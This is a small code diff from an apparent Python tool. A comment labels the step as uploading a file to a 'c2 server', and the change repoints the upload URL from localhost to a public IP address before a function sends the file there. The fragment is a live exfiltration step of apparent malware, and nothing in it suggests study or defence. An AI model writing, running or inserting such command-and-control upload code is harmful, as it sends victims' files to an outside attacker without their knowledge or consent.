@@ -259,5 +259,5 @@ if __name__ == "__main__":
     # upload file to c2 server
     remote_file = Path(temp_path).joinpath(file_name)
 
-    remote_upload_url = f"http://127.0.0.1:8081/upload" 
+    remote_upload_url = f"http://20.93.23.234:8081/upload" 
     senscanner._send_file(file_name, remote_upload_url)
